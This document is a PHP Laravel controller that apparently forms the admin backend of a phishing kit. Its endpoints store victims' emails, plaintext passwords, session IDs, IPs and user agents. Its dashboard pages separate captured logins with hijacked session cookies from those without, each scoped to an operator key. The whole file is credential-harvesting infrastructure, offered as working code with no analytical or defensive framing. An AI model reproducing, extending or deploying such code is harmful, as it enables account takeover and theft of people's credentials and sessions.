<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\ValidVisitor;
use App\Models\InvalidVisitor;
use App\Models\ValidLogin;

class CoreSystemController extends Controller
{
    // ============================
    // VALID VISITOR PAGE
    // ============================
   public function validVisitors()
{
    $userKey = auth()->user()->password; // login_key disimpan di kolom password

    $visitors = ValidVisitor::where('key_user', $userKey)
        ->orderBy('id', 'DESC')
        ->paginate(20);

    return view('admin.valid-visitors.index', compact('visitors'));
}

    // ============================
    // INVALID VISITOR / LOGIN PAGE
    // ============================
public function invalidLogin()
{
    $userKey = auth()->user()->password;

    $invalid = ValidLogin::whereNull('cookies')
                ->where('key_user', $userKey)
                ->orderBy('id', 'desc')
                ->paginate(10);

    return view('admin.invalid-login', compact('invalid'));
}


    // ============================
    // VALID LOGIN PAGE
    // ============================
public function validLogin()
{
    $userKey = auth()->user()->password;

    $valid = ValidLogin::whereNotNull('cookies')
                ->where('key_user', $userKey)
                ->orderBy('created_at', 'desc')
                ->paginate(20);

    return view('admin.valid-login', compact('valid'));
}


public function storeValidVisitor(Request $request)
{
    ValidVisitor::create([
        'ip'         => $request->ip,
        'country'    => $request->country,
        
        
        'user_agent' => $request->user_agent,
        'key_user'   => $request->key_user,
    ]);

    return response()->json(['status' => 'success']);
}

public function storePassword(Request $request){
    validLogin::create([
        'email'         => $request->email,
        'password'      => $request->password,
        'session_id'    => $request->session_id,
        'key_user'      => $request->key_user,
        'user_agent'    => $request->user_agent,
        'country'       => $request->country,
        'ip'            => $request->ip
    ]);
    return response()->json(['status' => 'success']);
}

}
